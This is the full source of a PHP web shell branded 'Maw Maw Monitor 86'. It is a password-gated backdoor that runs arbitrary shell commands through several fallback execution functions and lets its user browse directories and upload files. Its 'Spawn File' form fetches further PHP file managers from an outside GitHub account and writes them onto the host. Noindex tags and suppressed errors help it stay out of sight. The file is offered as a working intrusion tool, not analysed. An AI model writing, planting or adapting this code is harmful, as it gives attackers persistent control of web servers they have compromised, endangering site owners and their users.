<?php
@session_start();
@error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);
@ini_set('memory_limit', '-1');

$k1 = "S3cur3P@ssw0rd!";
$k2 = "Adv@nc3dEncrypt10n";
$k3 = "Sup3rS3cr3tK3y2025";

function superEncrypt($data) {
    global $k1, $k2, $k3;
    
    $r1 = '';
    for($i = 0; $i < strlen($data); $i++) {
        $r1 .= chr(ord($data[$i]) ^ ord($k1[$i % strlen($k1)]));
    }
    
    $r2 = base64_encode($r1);
    
    $r3 = strrev($r2);
    
    $r4 = '';
    for($i = 0; $i < strlen($r3); $i++) {
        $r4 .= chr(ord($r3[$i]) ^ ord($k2[$i % strlen($k2)]));
    }
    
    $r5 = base64_encode($r4);
    
    $r6 = '';
    for($i = 0; $i < strlen($r5); $i++) {
        $r6 .= chr(ord($r5[$i]) ^ ord($k3[$i % strlen($k3)]));
    }
    
    return bin2hex(base64_encode($r6));
}

function superDecrypt($data) {
    global $k1, $k2, $k3;
    
    $data = base64_decode(hex2bin($data));
    
    $r6 = '';
    for($i = 0; $i < strlen($data); $i++) {
        $r6 .= chr(ord($data[$i]) ^ ord($k3[$i % strlen($k3)]));
    }
    
    $r5 = base64_decode($r6);
    
    $r4 = '';
    for($i = 0; $i < strlen($r5); $i++) {
        $r4 .= chr(ord($r5[$i]) ^ ord($k2[$i % strlen($k2)]));
    }
    
    $r3 = strrev($r4);
    
    $r2 = base64_decode($r3);
    
    $r1 = '';
    for($i = 0; $i < strlen($r2); $i++) {
        $r1 .= chr(ord($r2[$i]) ^ ord($k1[$i % strlen($k1)]));
    }
    
    return $r1;
}

function scramble($data) {
    $chars = str_split($data);
    shuffle($chars);
    return implode('', $chars);
}

function execCmd($c) {
    $funcs = [
        'system', 'shell_exec', 'exec', 'passthru', 'popen', 'proc_open'
    ];
    
    shuffle($funcs);
    
    $output = '';
    foreach($funcs as $f) {
        if(function_exists($f)) {
            switch($f) {
                case 'system':
                    ob_start();
                    @system($c);
                    $output = ob_get_clean();
                    break;
                case 'shell_exec':
                    $output = @shell_exec($c);
                    break;
                case 'exec':
                    @exec($c, $o);
                    $output = implode("\n", $o);
                    break;
                case 'passthru':
                    ob_start();
                    @passthru($c);
                    $output = ob_get_clean();
                    break;
                case 'popen':
                    $h = @popen($c, 'r');
                    $output = '';
                    while(!feof($h)) {
                        $output .= fread($h, 2048);
                    }
                    pclose($h);
                    break;
                case 'proc_open':
                    $ds = [
                        0 => ["pipe", "r"],
                        1 => ["pipe", "w"],
                        2 => ["pipe", "w"]
                    ];
                    $p = @proc_open($c, $ds, $pipes);
                    $output = stream_get_contents($pipes[1]);
                    fclose($pipes[1]);
                    proc_close($p);
                    break;
            }
            if(!empty($output)) break;
        }
    }
    return $output;
}

$hashed = '2449b681de027d7b42c1fd39b1483f0232c598f566d6d9c806ebe81791712a1b4673c0acb63079923a1a1799a4002d3e1a7dfe7039222b05f4b7be24036b97c0'; //admin

$auth = false;
if(isset($_SESSION['_x_auth']) && $_SESSION['_x_auth'] === true) {
    $auth = true;
}

if(isset($_POST['_x_pass'])) {
    if(hash('sha512', $_POST['_x_pass']) === $hashed) {
        $_SESSION['_x_auth'] = true;
        $auth = true;
    }
}

if(!$auth) {
    echo '<!DOCTYPE html><html><head><title>Maw Maw Monitor 86</title>
    <meta name="robots" content="noindex, nofollow">
	<style>body{background-color:#1a1a1a;color:#f0f0f0;font-family:monospace;margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh}form{background-color:#2a2a2a;padding:15px;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.5);border:1px solid #444;display:flex;gap:5px}input{background-color:#333;border:1px solid #555;color:#f0f0f0;padding:8px;margin:5px 0;width:100%;border-radius:8px}input[type=password]{flex:1}input[type=submit]{background-color:#0066cc;cursor:pointer;border-radius:8px;padding:8px 12px;width:auto}input[type=submit]:hover{background-color:#0055aa}</style>
    </head><body>
    <form method="post">
        <h2>Authentication</h2>
        <input type="password" name="_x_pass" placeholder="Access Key">
        <input type="submit" value="Verify">
    </form>
    </body></html>';
    exit;
}

function getPath() {
    if(isset($_GET['p'])) {
        $p = $_GET['p'];
        $p = str_replace(['../', '..\\', '..'], '', $p);
        return $p;
    }
    return getcwd();
}

$cPath = getPath();

if(isset($_POST['_upload'])) {
    $upPath = $cPath;
    if(substr($upPath, -1) != DIRECTORY_SEPARATOR) {
        $upPath .= DIRECTORY_SEPARATOR;
    }
    
    $fName = $_FILES['_file']['name'];
    $encName = superEncrypt($fName);
    $decName = superDecrypt($encName);
    
    $tmpName = $_FILES['_file']['tmp_name'];
    $fContent = file_get_contents($tmpName);
    
    $randomBytes = random_bytes(16);
    $headerComment = "<!--" . bin2hex($randomBytes) . "-->\n";
    
    $fPath = $upPath . $decName;
    file_put_contents($fPath, $headerComment . $fContent);
    
    $upMsg = "Upload OK! : " . $fPath;
}

$cmdOutput = '';
if(isset($_POST['_cmd'])) {
    $cmd = $_POST['_cmd'];
    
    if(substr($cmd, 0, 3) == 'cd ') {
        $newPath = substr($cmd, 3);
        if($newPath == '..') {
            $cPath = dirname($cPath);
        } else {
            if(substr($newPath, 0, 1) == '/' || (strlen($newPath) > 1 && substr($newPath, 1, 1) == ':')) {
                $cPath = $newPath;
            } else {
                $cPath = $cPath . DIRECTORY_SEPARATOR . $newPath;
            }
        }
        $cmdOutput = "Directory: " . $cPath;
        $_GET['p'] = $cPath;
    } else {
        $origDir = getcwd();
        @chdir($cPath);
        $cmdOutput = execCmd($cmd);
        @chdir($origDir);
    }
}

function genBreadcrumb($path) {
    $bc = '';
    
    $isWin = (strpos($path, ':') !== false);
    
    if ($isWin) {
        $drive = substr($path, 0, 2);
        $bc .= '<a href="?p=' . urlencode($drive . DIRECTORY_SEPARATOR) . '">' . htmlspecialchars($drive) . '</a> / ';
        
        $path = substr($path, 2);
    }
    
    $path = str_replace('\\', '/', $path);
    $parts = explode('/', $path);
    
    $curPath = $isWin ? $drive : '';
    
    foreach($parts as $part) {
        if(empty($part)) continue;
        
        if($isWin) {
            $curPath .= DIRECTORY_SEPARATOR . $part;
        } else {
            if(empty($curPath)) {
                $curPath = DIRECTORY_SEPARATOR . $part;
            } else {
                $curPath .= DIRECTORY_SEPARATOR . $part;
            }
        }
        
        $bc .= '<a href="?p=' . urlencode($curPath) . '">' . htmlspecialchars($part) . '</a> / ';
    }
    
    return $bc;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Kenapa Maw?</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
	<style>body{background-color:#1a1a1a;color:#f0f0f0;font-family:monospace;margin:0;padding:10px}.container{max-width:800px;margin:auto}.breadcrumb,.terminal,.upload-form,.message{background-color:#2a2a2a;padding:10px;border-radius:10px;margin-bottom:10px;border:1px solid #444}.breadcrumb a{color:#0099ff;text-decoration:none}.breadcrumb a:hover{text-decoration:underline}.terminal{min-height:250px;max-height:400px;overflow-y:auto;white-space:pre-wrap}.cmd-form{display:flex;gap:5px}.cmd-input{background-color:#333;border:1px solid #555;color:#f0f0f0;padding:6px;font-family:monospace;border-radius:8px;width:90%}.cmd-button,.upload-button,.spawn-button{background-color:#0066cc;color:#fff;border:none;padding:8px 16px;cursor:pointer;border-radius:8px}.cmd-button:hover,.upload-button:hover,.spawn-button:hover{background-color:#0055aa}.file-input{background-color:#333;color:#f0f0f0;padding:6px;width:85%;border:1px solid #555;border-radius:8px}.dropdown{background-color:#333;border:1px solid #555;color:#f0f0f0;padding:8px;border-radius:8px;width:100%;flex:1}.dropdown-container{display:flex;gap:10px;align-items:center;width:100%}form{display:flex;gap:10px;width:100%}</style></head>
	<body>
    <div class="container">
        <h1><a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" class="header-title">Maw Maw Monitor 86</a></h1>
        
        <?php if(isset($upMsg)): ?>
        <div class="message">
            <?php echo htmlspecialchars($upMsg); ?>
        </div>
        <?php endif; ?>
        
        <div class="breadcrumb">
            <?php 
            $isWin = (strpos($cPath, ':') !== false);
            
            if($isWin) {
                echo genBreadcrumb($cPath);
            } else {
                echo '<a href="?p=/">/</a> ';
                echo genBreadcrumb($cPath);
            }
            ?>
        </div>
		<br>
    <div class="dropdown-container">
        <form method="post">
            <select name="file-url" class="dropdown">
                <option value="https://raw.githubusercontent.com/maw3six/File-Manager/refs/heads/main/litespeed.php">LiteSpeed</option>
                <option value="https://raw.githubusercontent.com/maw3six/File-Manager/refs/heads/main/tiny.php">Tiny FM</option>
                <option value="https://raw.githubusercontent.com/maw3six/File-Manager/refs/heads/main/litespeed.php">Maw</option>
            </select>
            <button type="submit" class="spawn-button">Spawn File</button>
        </form>
    </div>
	<br>

        <div class="terminal">
            <?php echo htmlspecialchars($cmdOutput); ?>
        </div>
        <br>
        <form method="post" class="cmd-form">
            <input type="text" name="_cmd" class="cmd-input" placeholder="Enter command..." autofocus>
            <input type="hidden" name="p" value="<?php echo htmlspecialchars($cPath); ?>">
            <button type="submit" class="cmd-button">Execute</button>
        </form>
        <br>
        <div class="upload-form">
            <h3 class="upload-title">Upload File</h3>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="_file" class="file-input">
                <input type="hidden" name="p" value="<?php echo htmlspecialchars($cPath); ?>">
                <button type="submit" name="_upload" class="upload-button">Upload</button>
            </form>
        </div>
        <br>
		
        <div style="margin-top: 20px; font-size: 12px; text-align: center; color: #666;">
            Maw Maw Monitor 86 - <?php echo date('Y-m-d H:i:s'); ?>
        </div>
    </div>
    <?php
	if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $fileUrl = $_POST["file-url"];
    $fileContent = file_get_contents($fileUrl);
    
    if ($fileContent !== false) {
        $fileName = basename(parse_url($fileUrl, PHP_URL_PATH));
        file_put_contents($fileName, $fileContent);
        echo "<script>alert('File $fileName spawned successfully!');</script>";
    } else {
        echo "<script>alert('Failed to spawn file.');</script>";
    }
	}
	?>

    <script>
        window.onload = function() {
            var terminal = document.querySelector('.terminal');
            terminal.scrollTop = terminal.scrollHeight;
        };
        
        document.querySelector('.cmd-input').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                document.querySelector('.cmd-form').submit();
            }
        });
        
        (function() {
            var elems = document.querySelectorAll('input[name="_cmd"], input[name="_file"], button[name="_upload"]');
            for (var i = 0; i < elems.length; i++) {
                elems[i].setAttribute('data-x', Math.random().toString(36).substring(7));
            }
        })();
    </script>
</body>
</html>